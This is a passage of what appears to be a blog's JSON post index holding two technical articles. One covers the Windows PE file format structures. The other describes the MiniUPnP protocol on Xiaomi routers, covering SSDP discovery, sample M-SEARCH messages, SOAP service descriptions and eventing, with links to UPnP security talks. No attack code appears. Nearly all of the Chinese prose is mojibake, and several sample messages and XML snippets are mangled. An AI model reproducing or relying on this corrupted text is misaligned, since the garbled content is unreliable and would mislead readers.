DOSç¨‹åºå¤´(4Hå­—èŠ‚)åŒ…æ‹¬MZæ–‡ä»¶å¤´å’ŒDOSæ’æ¡©ç¨‹åºã€‚MZæ–‡ä»¶å¤´å¼€å§‹ä¸¤ä¸ªå­—èŠ‚ä¸º4D5Aã€‚ NTæ˜ åƒå¤´(14Hå­—èŠ‚)å­˜æ”¾PEæ•´ä¸ªæ–‡ä»¶ä¿¡æ¯åˆ†å¸ƒçš„é‡è¦å­—æ®µã€‚åŒ…æ‹¬ï¼š ç­¾åï¼ˆsignatureï¼‰ï¼šå€¼ä¸ºâ€™50450000hâ€™ï¼Œå­—ä¸²ä¸ºâ€™PE\\0\\0â€™ï¼Œå¯ä»¥åœ¨DOSç¨‹åºå¤´çš„3CHå¤„çš„å››ä¸ªå­—èŠ‚æ‰¾åˆ°è¯¥å­—ä¸²çš„åç§»ä½ç½® æ˜ åƒæ–‡ä»¶å¤´ï¼ˆFileHeaderï¼‰ï¼šæ˜¯æ˜ åƒå¤´çš„ä¸»è¦éƒ¨åˆ†ï¼ŒåŒ…å«PEæ–‡ä»¶æœ€åŸºæœ¬çš„ä¿¡æ¯ã€‚ç»“æ„ä½“ä¸ºï¼š123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //è¿è¡Œå¹³å° WORD NumberOfSections; //èŠ‚(section)æ•°ç›® DWORD TimeDateStamp; //æ—¶é—´æ—¥æœŸæ ‡è®° DWORD PointerToSymbolTable; //COFFç¬¦å·æŒ‡é’ˆï¼Œè¿™æ˜¯ç¨‹åºè°ƒè¯•ä¿¡æ¯ DWORD NumberOfSymbols; //ç¬¦å·æ•° WORD SizeOfOptionalHeader; //å¯é€‰éƒ¨é¦–é•¿åº¦ï¼Œæ˜¯IMAGE_OPTIONAL_HEADERçš„é•¿åº¦ WORD Characteristics; //æ–‡ä»¶å±æ€§&#125; å¯é€‰æ˜ åƒå¤´(OptionalHeader)åŒ…å«PEæ–‡ä»¶çš„é€»è¾‘åˆ†å¸ƒä¿¡æ¯ï¼Œå…±æœ‰13ä¸ªåŸŸã€‚å…·ä½“ç»“æ„ä¸ºï¼š 123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; //ä»£è¡¨çš„æ˜¯æ–‡ä»¶çš„æ ¼å¼ BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; //ä¿å­˜ç€EPçš„RVAã€‚ä¹Ÿå°±æ˜¯æœ€å…ˆæ‰§è¡Œä»£ç èµ·å§‹åœ°å€ã€‚ DWORD BaseOfCode; //è¡¨ç¤ºä»£ç æ®µèµ·å§‹RVAå…ˆçœ‹ä»–çš„å€¼ï¼Œæ˜¯1000 DWORD BaseOfData; DWORD ImageBase; //é»˜è®¤è£…å…¥åŸºåœ°å€ DWORD SectionAlignment; //èŠ‚åŒºåœ¨å†…å­˜ä¸­çš„æœ€ä¸‹å•ä½ DWORD FileAlignment; //èŠ‚åŒºåœ¨ç£ç›˜ä¸­çš„æœ€å°å•ä½ WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; //è£…å…¥å†…å­˜åçš„æ€»å°ºå¯¸ DWORD SizeOfHeaders; //å¤´å°ºå¯¸=NTæ˜ åƒå¤´+èŠ‚è¡¨ DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER; èŠ‚è¡¨å®é™…ä¸Šæ˜¯ä¸€ä¸ªç»“æ„æ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸ªç»“æ„åŒ…å«äº†ä¸€ä¸ªèŠ‚çš„å…·ä½“ä¿¡æ¯ï¼ˆæ¯ä¸ªç»“æ„å ç”¨28Hå­—èŠ‚ï¼‰ 123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union &#123; DWORD PhysicalAddress; DWORD VirtualSize; //è¯¥èŠ‚çš„å®é™…å­—èŠ‚æ•° &#125; Misc; DWORD VirtualAddress; //æœ¬èŠ‚çš„ç›¸å¯¹è™šæ‹Ÿåœ°å€ DWORD SizeOfRawData; //å¯¹é½åçš„èŠ‚å°ºå¯¸ DWORD PointerToRawData; //æœ¬èŠ‚åœ¨æ–‡ä»¶ä¸­çš„åœ°å€ DWORD PointerToRelocations; //æœ¬èŠ‚è°ƒå…¥å†…å­˜åçš„å­˜æ”¾ä½ç½® DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; //èŠ‚çš„å±æ€§&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; èŠ‚ å¼•å…¥å‡½æ•°èŠ‚(.rdata/.idata) 1234567891011121314typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) &#125;; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real datetime stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)&#125; IMAGE_IMPORT_DESCRIPTOR; ä¸€ä¸ªexeç¨‹åºåŠ è½½dllçš„IMAGE_IMPORT_DESCRIPTOR","categories":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/categories/äºŒè¿›åˆ¶/"}],"tags":[{"name":"æ–‡ä»¶æ ¼å¼","slug":"æ–‡ä»¶æ ¼å¼","permalink":"https://cool-y.github.io/tags/æ–‡ä»¶æ ¼å¼/"},{"name":"PE","slug":"PE","permalink":"https://cool-y.github.io/tags/PE/"}]},{"title":"å°ç±³è·¯ç”±å™¨_MiniUPnPåè®®","slug":"XIAOMI-UPnP","date":"2019-04-21T06:51:45.000Z","updated":"2021-04-10T13:52:11.589Z","comments":true,"path":"2019/04/21/XIAOMI-UPnP/","link":"","permalink":"https://cool-y.github.io/2019/04/21/XIAOMI-UPnP/","excerpt":"","text":"æ¦‚è¿°HomePageOpenWRTä¸miniUPnP MiniUPnPé¡¹ç›®æä¾›äº†æ”¯æŒUPnP IGD(äº’è”ç½‘ç½‘å…³è®¾å¤‡)è§„èŒƒçš„è½¯ä»¶ã€‚åœ¨MiniUPnPdä¸­æ·»åŠ äº†NAT-PMPå’ŒPCPæ”¯æŒã€‚ å¯¹äºå®¢æˆ·ç«¯ï¼ˆMiniUPnPcï¼‰ä½¿ç”¨libnatpmpæ¥æ”¯æŒNAT-PMPã€‚MiniUPnPå®ˆæŠ¤ç¨‹åºï¼ˆMiniUPnPdï¼‰æ”¯æŒOpenBSDï¼ŒFreeBSDï¼ŒNetBSDï¼ŒDragonFly BSDï¼ˆOpenï¼‰Solariså’ŒMac OS Xä»¥åŠpfæˆ–ipfwï¼ˆipfirewallï¼‰æˆ–ipfå’ŒLinux with netfilterã€‚ MiniUPnPå®¢æˆ·ç«¯ï¼ˆMiniUPnPcï¼‰å’ŒMiniSSDPdæ˜¯ä¾¿æºå¼çš„ï¼Œå¯ä»¥åœ¨ä»»ä½•POSIXç³»ç»Ÿä¸Šè¿è¡Œã€‚ MiniUPnPcä¹Ÿé€‚ç”¨äºMS Windowså’ŒAmigaOSï¼ˆç‰ˆæœ¬3å’Œ4ï¼‰ã€‚ https://2014.ruxcon.org.au/assets/2014/slides/rux-soap_upnp_ruxcon2014.pptxhttps://www.akamai.com/us/en/multimedia/documents/white-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdfhttps://www.defcon.org/images/defcon-19/dc-19-presentations/Garcia/DEFCON-19-Garcia-UPnP-Mapping.pdf UPnP IGDå®¢æˆ·ç«¯è½»é‡çº§åº“å’ŒUPnP IGDå®ˆæŠ¤è¿›ç¨‹å¤§å¤šæ•°å®¶åº­adsl /æœ‰çº¿è·¯ç”±å™¨å’ŒMicrosoft Windows 2K/XPéƒ½æ”¯æŒUPnPåè®®ã€‚ MiniUPnPé¡¹ç›®çš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªå…è´¹çš„è½¯ä»¶è§£å†³æ–¹æ¡ˆæ¥æ”¯æŒåè®®çš„â€œInternetç½‘å…³è®¾å¤‡â€éƒ¨åˆ†ã€‚ ç”¨äºUPnPè®¾å¤‡çš„Linux SDKï¼ˆlibupnpï¼‰å¯¹æˆ‘æ¥è¯´ä¼¼ä¹å¤ªæ²‰é‡äº†ã€‚ æˆ‘æƒ³è¦æœ€ç®€å•çš„åº“ï¼Œå ç”¨ç©ºé—´æœ€å°ï¼Œå¹¶ä¸”ä¸ä¾èµ–äºå…¶ä»–åº“ï¼Œä¾‹å¦‚XMLè§£æå™¨æˆ–HTTPå®ç°ã€‚ æ‰€æœ‰ä»£ç éƒ½æ˜¯çº¯ANSI C. miniupnpå®¢æˆ·ç«¯åº“åœ¨x86 PCä¸Šç¼–è¯‘ï¼Œä»£ç å¤§å°ä¸åˆ°50KBã€‚miniUPnPå®ˆæŠ¤ç¨‹åºæ¯”ä»»ä½•å…¶ä»–IGDå®ˆæŠ¤ç¨‹åºå°å¾—å¤šï¼Œå› æ­¤éå¸¸é€‚åˆåœ¨ä½å†…å­˜è®¾å¤‡ä¸Šä½¿ç”¨ã€‚ å®ƒä¹Ÿåªä½¿ç”¨ä¸€ä¸ªè¿›ç¨‹è€Œæ²¡æœ‰å…¶ä»–çº¿ç¨‹ï¼Œä¸ä½¿ç”¨ä»»ä½•systemï¼ˆï¼‰æˆ–execï¼ˆï¼‰è°ƒç”¨ï¼Œå› æ­¤ä¿æŒç³»ç»Ÿèµ„æºä½¿ç”¨ç‡éå¸¸ä½ã€‚è¯¥é¡¹ç›®åˆ†ä¸ºä¸¤ä¸ªä¸»è¦éƒ¨åˆ†ï¼š MiniUPnPcï¼Œå®¢æˆ·ç«¯åº“ï¼Œä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿè®¿é—®ç½‘ç»œä¸Šå­˜åœ¨çš„UPnPâ€œInternetç½‘å…³è®¾å¤‡â€æä¾›çš„æœåŠ¡ã€‚ åœ¨UPnPæœ¯è¯­ä¸­ï¼ŒMiniUPnPcæ˜¯UPnPæ§åˆ¶ç‚¹ã€‚ MiniUPnPdï¼Œä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œé€šè¿‡ä½œä¸ºç½‘å…³çš„linuxæˆ–BSDï¼ˆç”šè‡³Solarisï¼‰ä¸ºæ‚¨çš„ç½‘ç»œæä¾›è¿™äº›æœåŠ¡ã€‚ éµå¾ªUPnPæœ¯è¯­ï¼ŒMiniUPnPdæ˜¯UPnPè®¾å¤‡ã€‚å¼€å‘MiniSSDPdä¸MiniUPnPcï¼ŒMiniUPnPdå’Œå…¶ä»–åä½œè½¯ä»¶ä¸€èµ·å·¥ä½œï¼š1. MiniSSDPdç›‘å¬ç½‘ç»œä¸Šçš„SSDPæµé‡ï¼Œå› æ­¤MiniUPnPcæˆ–å…¶ä»–UPnPæ§åˆ¶ç‚¹ä¸éœ€è¦æ‰§è¡Œå‘ç°è¿‡ç¨‹ï¼Œå¹¶ä¸”å¯ä»¥æ›´å¿«åœ°è®¾ç½®é‡å®šå‘ï¼› 2. MiniSSDPdè¿˜èƒ½å¤Ÿä»£è¡¨MiniUPnPdæˆ–å…¶ä»–UPnPæœåŠ¡å™¨è½¯ä»¶å›å¤M-SEARCH SSDPè¯·æ±‚ã€‚ è¿™å¯¹äºåœ¨åŒä¸€å°æœºå™¨ä¸Šæ‰˜ç®¡å¤šä¸ªUPnPæœåŠ¡å¾ˆæœ‰ç”¨ã€‚å®ˆæŠ¤è¿›ç¨‹ç°åœ¨ä¹Ÿå¯ä»¥ä½¿ç”¨netfilterç”¨äºlinux 2.4.xå’Œ2.6.x. å¯ä»¥ä½¿å®ƒåœ¨è¿è¡ŒOpenWRTçš„è·¯ç”±å™¨è®¾å¤‡ä¸Šè¿è¡Œã€‚ç”±äºæŸäº›åŸå› ï¼Œç›´æ¥ä½¿ç”¨MiniUPnPé¡¹ç›®ä¸­çš„ä»£ç å¯èƒ½ä¸æ˜¯ä¸€ä¸ªå¥½çš„è§£å†³æ–¹æ¡ˆã€‚ç”±äºä»£ç å¾ˆå°ä¸”æ˜“äºç†è§£ï¼Œå› æ­¤ä¸ºæ‚¨è‡ªå·±çš„UPnPå®ç°æä¾›çµæ„Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åŸºç¡€ã€‚ C ++ä¸­çš„KTorrent UPnPæ’ä»¶å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ MiniUPnPå®¢æˆ·ç«¯åº“çš„å®ç”¨æ€§åªè¦åº”ç”¨ç¨‹åºéœ€è¦ä¾¦å¬ä¼ å…¥çš„è¿æ¥ï¼ŒMiniUPnPå®¢æˆ·ç«¯åº“çš„ä½¿ç”¨å°±å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼šP2Påº”ç”¨ç¨‹åºï¼Œæ´»åŠ¨æ¨¡å¼çš„FTPå®¢æˆ·ç«¯ï¼ŒIRCï¼ˆç”¨äºDCCï¼‰æˆ–IMåº”ç”¨ç¨‹åºï¼Œç½‘ç»œæ¸¸æˆï¼Œä»»ä½•æœåŠ¡å™¨è½¯ä»¶ã€‚ è·¯ç”±å™¨çš„UPnP IGDåŠŸèƒ½çš„å…¸å‹ç”¨æ³•æ˜¯ä½¿ç”¨MSN Messengerçš„æ–‡ä»¶ä¼ è¾“ã€‚ MSN Messengerè½¯ä»¶ä½¿ç”¨Windows XPçš„UPnP APIæ‰“å¼€ä¼ å…¥è¿æ¥çš„ç«¯å£ã€‚ ä¸ºäº†æ¨¡ä»¿MSè½¯ä»¶ï¼Œæœ€å¥½ä¹Ÿä½¿ç”¨UPnPã€‚ å·²ç»ä¸ºXChatåšäº†ä¸€ä¸ªè¡¥ä¸ï¼Œä»¥å±•ç¤ºåº”ç”¨ç¨‹åºå¦‚ä½•ä½¿ç”¨miniupnpå®¢æˆ·ç«¯åº“ã€‚ ä¼ è¾“ï¼Œä¸€ä¸ªå…è´¹çš„è½¯ä»¶BitTorrentå®¢æˆ·ç«¯æ­£åœ¨ä½¿ç”¨miniupnpcå’Œlibnatpmpã€‚ MiniUPnPå®ˆæŠ¤è¿›ç¨‹çš„å®ç”¨æ€§UPnPå’ŒNAT-PMPç”¨äºæ”¹å–„NATè·¯ç”±å™¨åé¢çš„è®¾å¤‡çš„äº’è”ç½‘è¿æ¥ã€‚ è¯¸å¦‚æ¸¸æˆï¼ŒIMç­‰çš„ä»»ä½•å¯¹ç­‰ç½‘ç»œåº”ç”¨å¯å—ç›Šäºæ”¯æŒUPnPå’Œ/æˆ–NAT-PMPçš„NATè·¯ç”±å™¨ã€‚æœ€æ–°ä¸€ä»£çš„Microsoft XBOX 360å’ŒSony Playstation 3æ¸¸æˆæœºä½¿ç”¨UPnPå‘½ä»¤æ¥å¯ç”¨XBOX LiveæœåŠ¡å’ŒPlaystation Networkçš„åœ¨çº¿æ¸¸æˆã€‚ æ®æŠ¥é“ï¼ŒMiniUPnPdæ­£åœ¨ä¸ä¸¤ä¸ªæ§åˆ¶å°æ­£å¸¸å·¥ä½œã€‚ å®ƒå¯èƒ½éœ€è¦ä¸€ä¸ªç²¾ç»†çš„é…ç½®è°ƒæ•´ã€‚ å®‰å…¨UPnPå®æ–½å¯èƒ½ä¼šå—åˆ°å®‰å…¨æ¼æ´çš„å½±å“ã€‚ é”™è¯¯æ‰§è¡Œæˆ–é…ç½®çš„UPnP IGDæ˜“å—æ”»å‡»ã€‚ å®‰å…¨ç ”ç©¶å‘˜HD Mooreåšäº†å¾ˆå¥½çš„å·¥ä½œæ¥æ­ç¤ºç°æœ‰å®æ–½ä¸­çš„æ¼æ´ï¼šé€šç”¨å³æ’å³ç”¨ï¼ˆPDFï¼‰ä¸­çš„å®‰å…¨æ¼æ´ã€‚ ä¸€ä¸ªå¸¸è§çš„é—®é¢˜æ˜¯è®©SSDPæˆ–HTTP/SOAPç«¯å£å¯¹äº’è”ç½‘å¼€æ”¾ï¼šå®ƒä»¬åº”è¯¥åªèƒ½ä»LANè®¿é—®ã€‚ åè®®æ ˆå·¥ä½œæµç¨‹ Linuxä½“ç³»ç»“æ„ å‘ç°ç»™å®šä¸€ä¸ªIPåœ°å€ï¼ˆé€šè¿‡DHCPè·å¾—ï¼‰ï¼ŒUPnPç½‘ç»œä¸­çš„ç¬¬ä¸€æ­¥æ˜¯å‘ç°ã€‚å½“ä¸€ä¸ªè®¾å¤‡è¢«åŠ å…¥åˆ°ç½‘ç»œä¸­å¹¶æƒ³çŸ¥é“ç½‘ç»œä¸Šå¯ç”¨çš„UPnPæœåŠ¡æ—¶ï¼ŒUPnPæ£€æµ‹åè®®å…è®¸è¯¥è®¾å¤‡å‘æ§åˆ¶ç‚¹å¹¿æ’­è‡ªå·±çš„æœåŠ¡ã€‚é€šè¿‡UDPåè®®å‘ç«¯å£1900ä¸Šçš„å¤šæ’­åœ°å€239.255.255.250å‘é€å‘ç°æ¶ˆæ¯ã€‚æ­¤æ¶ˆæ¯åŒ…å«æ ‡å¤´ï¼Œç±»ä¼¼äºHTTPè¯·æ±‚ã€‚æ­¤åè®®æœ‰æ—¶ç§°ä¸ºHTTPUï¼ˆHTTP over UDPï¼‰ï¼š12345M-SEARCH * HTTP / 1.1ä¸»æœºï¼š239.255.255.250 ï¼š1900MANï¼šssdpï¼šdiscoverMXï¼š10STï¼šssdpï¼šall æ‰€æœ‰å…¶ä»–UPnPè®¾å¤‡æˆ–ç¨‹åºéƒ½éœ€è¦é€šè¿‡ä½¿ç”¨UDPå•æ’­å°†ç±»ä¼¼çš„æ¶ˆæ¯å‘é€å›è®¾å¤‡æ¥å“åº”æ­¤æ¶ˆæ¯ï¼Œå¹¶å®£å¸ƒè®¾å¤‡æˆ–ç¨‹åºå®ç°å“ªäº›UPnPé…ç½®æ–‡ä»¶ã€‚å¯¹äºæ¯ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒå®ç°ä¸€æ¡æ¶ˆæ¯å‘é€ï¼š1234567HTTP / 1.1 200 OKCACHE-CONTROLï¼šmax-age = 1800EXTï¼šLOCATIONï¼šhttpï¼š//10.0.0.138ï¼š80 / IGD.xmlSERVERï¼šSpeedTouch 510 4.0.0.9.0 UPnP / 1.0ï¼ˆDG233B00011961ï¼‰STï¼šurnï¼šschemas-upnp-orgï¼šserviceï¼šWANPPPConnectionï¼š1USNï¼šuuidï¼šUPnP-SpeedTouch510 :: urnï¼šschemas-upnp-orgï¼šserviceï¼šWANPPPConnectionï¼š1 ç±»ä¼¼åœ°ï¼Œå½“ä¸€ä¸ªæ§åˆ¶ç‚¹åŠ å…¥åˆ°ç½‘ç»œä¸­çš„æ—¶å€™ï¼Œå®ƒä¹Ÿèƒ½å¤Ÿæœç´¢åˆ°ç½‘ç»œä¸­å­˜åœ¨çš„ã€æ„Ÿå…´è¶£çš„è®¾å¤‡ç›¸å…³ä¿¡æ¯ã€‚è¿™ä¸¤ç§ç±»å‹çš„åŸºç¡€äº¤äº’æ˜¯ä¸€ç§ä»…åŒ…å«å°‘é‡ã€é‡è¦ç›¸å…³è®¾å¤‡ä¿¡æ¯æˆ–è€…å®ƒçš„æŸä¸ªæœåŠ¡ã€‚æ¯”å¦‚ï¼Œç±»å‹ã€æ ‡è¯†å’ŒæŒ‡å‘æ›´è¯¦ç»†ä¿¡æ¯çš„é“¾æ¥ã€‚UPnPæ£€æµ‹åè®®æ˜¯ åŸºäºç®€å•æœåŠ¡å‘ç°åè®®ï¼ˆSSDPï¼‰ çš„ã€‚ æè¿°UPnPç½‘ç»œçš„ä¸‹ä¸€æ­¥æ˜¯æè¿°ã€‚å½“ä¸€ä¸ªæ§åˆ¶ç‚¹æ£€æµ‹åˆ°ä¸€ä¸ªè®¾å¤‡æ—¶ï¼Œå®ƒå¯¹è¯¥è®¾å¤‡ä»ç„¶çŸ¥ä¹‹ç”šå°‘ã€‚ä¸ºäº†ä½¿æ§åˆ¶ç‚¹äº†è§£æ›´å¤šå…³äºè¯¥è®¾å¤‡çš„ä¿¡æ¯æˆ–è€…å’Œè®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œæ§åˆ¶ç‚¹å¿…é¡»ä»è®¾å¤‡å‘å‡ºçš„æ£€æµ‹ä¿¡æ¯ä¸­åŒ…å«çš„URLè·å–æ›´å¤šçš„ä¿¡æ¯ã€‚æŸä¸ªè®¾å¤‡çš„UPnPæè¿°æ˜¯ XML çš„æ–¹å¼,é€šè¿‡httpåè®®ï¼ŒåŒ…æ‹¬å“ç‰Œã€å‚å•†ç›¸å…³ä¿¡æ¯ï¼Œå¦‚å‹å·åå’Œç¼–å·ã€åºåˆ—å·ã€å‚å•†åã€å“ç‰Œç›¸å…³URLç­‰ã€‚æè¿°è¿˜åŒ…æ‹¬ä¸€ä¸ªåµŒå…¥å¼è®¾å¤‡å’ŒæœåŠ¡åˆ—è¡¨ï¼Œä»¥åŠæ§åˆ¶ã€äº‹ä»¶ä¼ é€’å’Œå­˜åœ¨ç›¸å…³çš„URLã€‚å¯¹äºæ¯ç§è®¾å¤‡ï¼Œæè¿°è¿˜åŒ…æ‹¬ä¸€ä¸ªå‘½ä»¤æˆ–åŠ¨ä½œåˆ—è¡¨ï¼ŒåŒ…æ‹¬å“åº”ä½•ç§æœåŠ¡ï¼Œé’ˆå¯¹å„ç§åŠ¨ä½œçš„å‚æ•°ï¼›è¿™äº›å˜é‡æè¿°å‡ºè¿è¡Œæ—¶è®¾å¤‡çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶é€šè¿‡å®ƒä»¬çš„æ•°æ®ç±»å‹ã€èŒƒå›´å’Œäº‹ä»¶æ¥è¿›è¡Œæè¿°ã€‚ æ§åˆ¶UPnPç½‘ç»œçš„ä¸‹ä¸€æ­¥æ˜¯æ§åˆ¶ã€‚å½“ä¸€ä¸ªæ§åˆ¶ç‚¹è·å–åˆ°è®¾å¤‡æè¿°ä¿¡æ¯ä¹‹åï¼Œå®ƒå°±å¯ä»¥å‘è¯¥è®¾å¤‡å‘é€æŒ‡ä»¤äº†ã€‚ä¸ºäº†å®ç°æ­¤ï¼Œæ§åˆ¶ç‚¹å‘é€ä¸€ä¸ªåˆé€‚çš„æ§åˆ¶æ¶ˆæ¯è‡³æœåŠ¡ç›¸å…³æ§åˆ¶URLï¼ˆåŒ…å«åœ¨è®¾å¤‡æè¿°ä¸­ï¼‰ã€‚1234567&lt;service&gt; &lt;serviceType&gt; urnï¼šschemas-upnp-orgï¼šserviceï¼šWANPPPConnectionï¼š1 &lt;/ serviceType&gt; &lt;serviceId&gt; urnï¼šupnp-orgï¼š serviceIdï¼šwanpppcï¼špppoa &lt;/ serviceId&gt; &lt;controlURL&gt; / upnp / control / wanpppcpppoa &lt;/ controlURL&gt; &lt;eventSubURL&gt; / upnp / event / wanpppcpppoa &lt;/ eventSubURL&gt; &lt;SCPDURL&gt; /WANPPPConnection.xml &lt;/ SCPDURL&gt;&lt;/ service&gt; è¦å‘é€SOAPè¯·æ±‚ï¼Œåªéœ€è¦controlURLæ ‡è®°å†…çš„URLã€‚æ§åˆ¶æ¶ˆæ¯ä¹Ÿæ˜¯é€šè¿‡ ç®€å•å¯¹è±¡è®¿é—®åè®®ï¼ˆSOAPï¼‰ ç”¨XMLæ¥æè¿°çš„ã€‚ç±»ä¼¼å‡½æ•°è°ƒç”¨ï¼ŒæœåŠ¡é€šè¿‡è¿”å›åŠ¨ä½œç›¸å…³çš„å€¼æ¥å›åº”æ§åˆ¶æ¶ˆæ¯ã€‚åŠ¨ä½œçš„æ•ˆæœï¼Œå¦‚æœæœ‰çš„è¯ï¼Œä¼šååº”åœ¨ç”¨äºåˆ»ç”»è¿è¡Œä¸­æœåŠ¡çš„ç›¸å…³å˜é‡ã€‚ äº‹ä»¶é€šçŸ¥ä¸‹ä¸€æ­¥æ˜¯äº‹ä»¶é€šçŸ¥ã€‚UPnPä¸­çš„äº‹ä»¶ åè®®åŸºäºGENA ã€‚ä¸€ä¸ªUPnPæè¿°åŒ…æ‹¬ä¸€ç»„å‘½ä»¤åˆ—è¡¨å’Œåˆ»ç”»è¿è¡Œæ—¶çŠ¶æ€ä¿¡æ¯çš„å˜é‡ã€‚æœåŠ¡åœ¨è¿™äº›å˜é‡æ”¹å˜çš„æ—¶å€™è¿›è¡Œæ›´æ–°ï¼Œæ§åˆ¶ç‚¹å¯ä»¥è¿›è¡Œè®¢é˜…ä»¥è·å–ç›¸å…³æ”¹å˜ã€‚æœåŠ¡é€šè¿‡å‘é€äº‹ä»¶æ¶ˆæ¯æ¥å‘å¸ƒæ›´æ–°ã€‚äº‹ä»¶æ¶ˆæ¯åŒ…æ‹¬ä¸€ä¸ªæˆ–å¤šä¸ªçŠ¶æ€ä¿¡æ¯å˜é‡ä»¥åŠå®ƒä»¬çš„å½“å‰æ•°å€¼ã€‚è¿™äº›æ¶ˆæ¯ä¹Ÿæ˜¯é‡‡ç”¨XMLçš„æ ¼å¼ï¼Œç”¨é€šç”¨äº‹ä»¶é€šçŸ¥ä½“ç³»è¿›è¡Œæ ¼å¼åŒ–ã€‚ä¸€ä¸ªç‰¹æ®Šçš„åˆå§‹åŒ–æ¶ˆæ¯ä¼šåœ¨æ§åˆ¶ç‚¹ç¬¬ä¸€æ¬¡è®¢é˜…çš„æ—¶å€™å‘é€ï¼Œå®ƒåŒ…æ‹¬æœåŠ¡ç›¸å…³çš„å˜é‡ååŠå€¼ã€‚ä¸ºäº†æ”¯æŒå¤šä¸ªæ§åˆ¶ç‚¹å¹¶å­˜çš„æƒ…å½¢ï¼Œäº‹ä»¶é€šçŸ¥è¢«è®¾è®¡æˆå¯¹äºæ‰€æœ‰çš„æ§åˆ¶ç‚¹éƒ½å¹³è¡Œé€šçŸ¥ã€‚å› æ­¤ï¼Œæ‰€æœ‰çš„è®¢é˜…è€…åŒç­‰åœ°æ”¶åˆ°æ‰€æœ‰äº‹ä»¶é€šçŸ¥ã€‚å½“çŠ¶æ€å˜é‡æ›´æ”¹æ—¶ï¼Œæ–°çŠ¶æ€å°†å‘é€åˆ°å·²è®¢é˜…è¯¥äº‹ä»¶çš„æ‰€æœ‰ç¨‹åº/è®¾å¤‡ã€‚ç¨‹åº/è®¾å¤‡å¯ä»¥é€šè¿‡eventSubURLæ¥è®¢é˜…æœåŠ¡çš„çŠ¶æ€å˜é‡ï¼Œè¯¥URLå¯ä»¥åœ¨LOCATIONæŒ‡å‘çš„URLä¸­æ‰¾åˆ°ã€‚1234567&lt;service&gt; &lt;serviceType&gt; urnï¼šschemas-upnp-orgï¼šserviceï¼šWANPPPConnectionï¼š1 &lt;/ serviceType&gt; &lt;serviceId&gt; urnï¼šupnp-orgï¼šserviceIdï¼šwanpppcï¼špppoa &lt;/ serviceId&gt; &lt;controlURL&gt; / upnp / control / wanpppcpppoa &lt;/ controlURL&gt; &lt;eventSubURL&gt; / upnp / event / wanpppcpppoa &lt; &lt;SCPDURL&gt; /WANPPPConnection.xml &lt;/ SCPDURL&gt;&lt;/ service&gt; å±•ç¤ºæœ€åä¸€æ­¥æ˜¯å±•ç¤ºã€‚å¦‚æœè®¾å¤‡å¸¦æœ‰å­˜åœ¨URLï¼Œé‚£ä¹ˆæ§åˆ¶ç‚¹å¯ä»¥é€šè¿‡å®ƒæ¥è·å–è®¾å¤‡å­˜åœ¨ä¿¡æ¯ï¼Œå³åœ¨æµè§ˆå™¨ä¸­åŠ è½½URLï¼Œå¹¶å…è®¸ç”¨æˆ·æ¥è¿›è¡Œç›¸å…³æ§åˆ¶æˆ–æŸ¥çœ‹æ“ä½œã€‚å…·ä½“æ”¯æŒå“ªäº›æ“ä½œåˆ™æ˜¯ç”±å­˜åœ¨é¡µé¢å’Œè®¾å¤‡å®Œæˆçš„ã€‚ NATç©¿é€UPnPä¸ºNATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰ç©¿é€å¸¦æ¥äº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼šäº’è”ç½‘ç½‘å…³è®¾å¤‡åè®®ï¼ˆIGDï¼‰ã€‚NATç©¿é€å…è®¸UPnPæ•°æ®åŒ…åœ¨æ²¡æœ‰ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹ï¼Œæ— éšœç¢çš„é€šè¿‡è·¯ç”±å™¨æˆ–è€…é˜²ç«å¢™ï¼ˆå‡å¦‚é‚£ä¸ªè·¯ç”±å™¨æˆ–è€…é˜²ç«å¢™æ”¯æŒNATï¼‰ã€‚ SOAPå’ŒUPnP åè®® å…¨ç§° UPnP Universal Plug and Play SSDP Simple Service Discovery Protocol SCPD Service Control Protocol Definition SOAP Simple Object Access Protocol UPnP - Discovery UPnP â€“ Description XMLæ–‡ä»¶é€šå¸¸æ‰˜ç®¡åœ¨é«˜ä½çš„TCPç«¯å£ 